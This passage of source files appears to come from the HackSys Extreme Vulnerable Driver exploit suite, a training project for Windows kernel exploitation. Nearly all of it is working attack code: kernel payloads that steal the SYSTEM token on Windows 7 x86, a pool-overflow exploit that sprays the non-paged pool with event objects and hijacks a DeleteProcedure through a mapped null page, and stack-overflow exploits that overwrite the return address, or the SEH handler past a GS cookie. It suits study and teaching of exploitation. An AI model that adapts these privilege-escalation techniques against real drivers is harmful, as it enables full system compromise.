    CurrentProcess->PrimaryTokenFrozen = 0;

    NtStatus = ZwSetInformationProcess(GetCurrentProcess(),
                                       ProcessAccessToken,
                                       &AccessToken,
                                       sizeof(AccessToken));

    if (hNewPrivilegedToken) {
        ZwClose(hNewPrivilegedToken);
    }

    if (hSystemProcessToken) {
        ZwClose(hSystemProcessToken);
    }

    if (hSystemProcess) {
        ZwClose(hSystemProcess);
    }
}

VOID TokenStealingPayloadPsReferencePrimaryToken() {
    // Publicly known Kernel Payload
    UINT32 i = 0;
    PULONG pUlong;
    PVOID SystemProcess = NULL;
    PVOID CurrentProcess = NULL;
    PACCESS_TOKEN SystemToken = NULL;
    PACCESS_TOKEN TargetToken = NULL;

    PsLookupProcessByProcessId((HANDLE)GetCurrentProcessId(), &CurrentProcess);
    PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);

    TargetToken = PsReferencePrimaryToken(CurrentProcess);
    SystemToken = PsReferencePrimaryToken(SystemProcess);

    *(PULONG)TargetToken &= 0xFFFFFFF8;

    for (i = 0; i < sizeof(EPROCESS); i++) {
        pUlong = (PULONG)((PCHAR)CurrentProcess + i);

        if ((*pUlong & 0xFFFFFFF8) == (ULONG)TargetToken) {
            *pUlong = (ULONG)SystemToken;
            break;
        }
    }
}

```

`Exploit/Payloads.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Payloads.h

Abstract:
    This module implements the data structures used by EoP payload.

--*/

#ifndef __PAYLOADS_H__
    #define __PAYLOADS_H__

    #pragma once

    #include "Common.h"

    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID

    VOID    TokenStealingPayloadWin7();
    VOID    TokenStealingPayladGSWin7();
    VOID    TokenStealingPayloadWin7New();
    VOID    TokenStealingPayloadWin7Generic();
    VOID    TokenStealingPayloadDuplicateToken();
    VOID    TokenStealingPayloadPoolOverflowWin7();
    VOID    TokenStealingPayloadPsReferencePrimaryToken();

#endif //__PAYLOADS_H__

```

`Exploit/PoolOverflow.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    PoolOverflow.c

Abstract:
    This module implements the exploit for Pool Overflow
    Vulnerability implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#include "PoolOverflow.h"

VOID SprayNonPagedPoolWithEventObjects() {
    UINT32 i = 0;

    for (i = 0; i < 10000; i++) {
        EventObjectArrayA[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

        if (!EventObjectArrayA[i]) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Event Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 0; i < 5000; i++) {
        EventObjectArrayB[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

        if (!EventObjectArrayB[i]) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Event Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID CreateHolesInNonPagedPoolByCoalescingEventObjects() {
    UINT32 i = 0;
    UINT32 j = 0;

    for (i = 0; i < 5000; i += 16) {
        for (j = 0; j < 8; j++) {
            if (!CloseHandle(EventObjectArrayB[i + j])) {
                DEBUG_ERROR("\t\t[-] Failed To Close Event Objects Handle: 0x%X\n", GetLastError());
                exit(EXIT_FAILURE);
            }
        }
    }
}

VOID FreeEventObjects() {
    UINT32 i = 0;
    UINT32 j = 0;

    for (i = 0; i < 10000; i++) {
        if (!CloseHandle(EventObjectArrayA[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Event Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 8; i < 5000; i += 16) {
        for (j = 0; j < 8; j++) {
            if (!CloseHandle(EventObjectArrayB[i + j])) {
                DEBUG_ERROR("\t\t[-] Failed To Close Event Objects Handle: 0x%X\n", GetLastError());
                exit(EXIT_FAILURE);
            }
        }
    }
}

DWORD WINAPI PoolOverflowThread(LPVOID Parameter) {
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    PVOID Memory = NULL;
    PULONG UserModeBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadPoolOverflowWin7;
    SIZE_T UserModeBufferSize = (ULONG)(POOL_BUFFER_SIZE + TYPE_INDEX_OVERWRITE);

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        // Allocate the Heap chunk
        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);

        if (!UserModeBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", UserModeBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", UserModeBufferSize);
        }

        DEBUG_INFO("\t\t[+] Mapping Null Page\n");

        if (!MapNullPage()) {
            DEBUG_ERROR("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);

        // Restore POOL_HEADER and set TypeIndex to 0x00 (TypeIndex is UChar)
        Memory = (PVOID)((ULONG)UserModeBuffer + (ULONG)POOL_BUFFER_SIZE);
        *(PULONG)Memory = (ULONG)0x04080040;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0xee657645;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000000;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000040;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000000;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000000;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000001;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000001;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00000000;
        Memory = (PVOID)((ULONG)Memory + 0x4);
        *(PULONG)Memory = (ULONG)0x00080000;

        DEBUG_INFO("\t\t\t[+] TypeIndex Of Event Object Set To: 0x0\n");

        DEBUG_INFO("\t\t[+] Preparing OBJECT_TYPE_INITIALIZER At Null Page\n");

        // Set the DeleteProcedure to the address of our payload
        *(PULONG)0x00000060 = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] DeleteProcedure: 0x%X\n", *(PULONG)0x00000060);
        DEBUG_INFO("\t\t\t[+] DeleteProcedure Address: 0x%p\n", (ULONG)0x00000060);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_INFO("\t\t[+] Preparing NonPaged Kernel Pool Layout\n");

        DEBUG_INFO("\t\t\t[+] Spraying With Event Objects\n");

        // Spray the NonPaged Pool
        SprayNonPagedPoolWithEventObjects();

        DEBUG_INFO("\t\t\t[+] Creating Holes By Coalescing\n");

        // Create the holes for the vulnerable buffer
        CreateHolesInNonPagedPoolByCoalescingEventObjects();

        DEBUG_MESSAGE("\t[+] Triggering Pool Overflow\n");

        OutputDebugString("****************Kernel Mode****************\n");

        // Allocate the vulnerable buffer in one of the holes we created
        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
                        (LPVOID)UserModeBuffer,
                        (DWORD)UserModeBufferSize,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t[+] Triggering Payload\n");

        DEBUG_INFO("\t\t\t[+] Freeing Event Objects\n");

        // Free the NonPaged Pool
        FreeEventObjects();

        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);

        UserModeBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/PoolOverflow.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    PoolOverflow.h

Abstract:
    This module implements the data structures used by the
    exploit for Pool Overflow Vulnerability implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#ifndef __POOL_OVERFLOW_H__
    #define __POOL_OVERFLOW_H__

    #pragma once

    #include "Common.h"

    #define POOL_BUFFER_SIZE 504
    #define TYPE_INDEX_OVERWRITE 40

    HANDLE    EventObjectArrayA[10000];
    HANDLE    EventObjectArrayB[5000];

    VOID            FreeEventObjects();
    VOID            SprayNonPagedPoolWithEventObjects();
    DWORD WINAPI    PoolOverflowThread(LPVOID Parameter);
    VOID            CreateHolesInNonPagedPoolByCoalescingEventObjects();

#endif //__POOL_OVERFLOW_H__

```

`Exploit/StackOverflow.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    StackOverflow.c

Abstract:
    This module implements the exploit for Stack Overflow
    Vulnerability implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#include "StackOverflow.h"

DWORD WINAPI StackOverflowThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    PVOID MemoryAddress = NULL;
    PULONG UserModeBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7;
    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * sizeof(ULONG);

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);

        if (!UserModeBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", UserModeBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", UserModeBufferSize);
        }

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);

        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - sizeof(ULONG));
        *(PULONG)MemoryAddress = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] RET Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] RET Address: 0x%p\n", MemoryAddress);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Kernel Stack Overflow\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
                        (LPVOID)UserModeBuffer,
                        (DWORD)UserModeBufferSize,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);

        UserModeBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/StackOverflow.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    StackOverflow.h

Abstract:
    This module implements the data structures used by the
    exploit for Stack Overflow Vulnerability implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#ifndef __STACK_OVERFLOW_H__
    #define __STACK_OVERFLOW_H__

    #pragma once

    #include "Common.h"

    #define RET_OVERWRITE 9

    DWORD WINAPI    StackOverflowThread(LPVOID Parameter);

#endif  //__STACK_OVERFLOW_H__

```

`Exploit/StackOverflowGS.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    StackOverflowGS.c

Abstract:
    This module implements the exploit for Stack Overflow
    Vulnerability protected by GS cookies implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#include "StackOverflowGS.h"

DWORD WINAPI StackOverflowGSThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    SIZE_T PageSize = 0x1000;
    HANDLE Sharedmemory = NULL;
    PVOID MemoryAddress = NULL;
    PVOID SuitableMemoryForBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    LPVOID SharedMappedMemoryAddress = NULL;
    SIZE_T SeHandlerOverwriteOffset = 0x214;
    PVOID EopPayload = &TokenStealingPayladGSWin7;
    LPCTSTR SharedMemoryName = (LPCSTR)SHARED_MEMORY_NAME;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Creating Shared Memory\n");

        // Create the shared memory
        Sharedmemory = CreateFileMapping(INVALID_HANDLE_VALUE,
                                         NULL,
                                         PAGE_EXECUTE_READWRITE,
                                         0,
                                         PageSize,
                                         SharedMemoryName);

        if (!Sharedmemory) {
            DEBUG_ERROR("\t\t\t[-] Failed To Create Shared Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Shared Memory Handle: 0x%p\n", Sharedmemory);
        }

        DEBUG_INFO("\t\t[+] Mapping Shared Memory To Current Process Space\n");

        // Map the shared memory in the process space of this process
        SharedMappedMemoryAddress = MapViewOfFile(Sharedmemory,
                                                  FILE_MAP_ALL_ACCESS,
                                                  0,
                                                  0,
                                                  PageSize);

        if (!SharedMappedMemoryAddress) {
            DEBUG_ERROR("\t\t\t[-] Failed To Map Shared Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Mapped Shared Memory: 0x%p\n", SharedMappedMemoryAddress);
        }

        SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset));

        DEBUG_INFO("\t\t[+] Suitable Memory For Buffer: 0x%p\n", SuitableMemoryForBuffer);

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        RtlFillMemory(SharedMappedMemoryAddress, PageSize, 0x41);

        MemoryAddress = (PVOID)((ULONG)SuitableMemoryForBuffer + 0x204);
        *(PULONG)MemoryAddress = 0x42424242;            // overwrite xor'ed cookie

        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Address: 0x%p\n", MemoryAddress);

        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = 0x43434343;            // junk

        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = 0x44444444;            // Next SE handler

        DEBUG_INFO("\t\t\t[+] Next SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] Next SE Handler Address: 0x%p\n", MemoryAddress);

        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = (ULONG)EopPayload;     // SE Handler

        DEBUG_INFO("\t\t\t[+] SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] SE Handler Address: 0x%p\n", MemoryAddress);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Kernel Stack Overflow GS\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS,
                        (LPVOID)SuitableMemoryForBuffer,
                        (DWORD)SeHandlerOverwriteOffset + RAISE_EXCEPTION_IN_KERNEL_MODE,
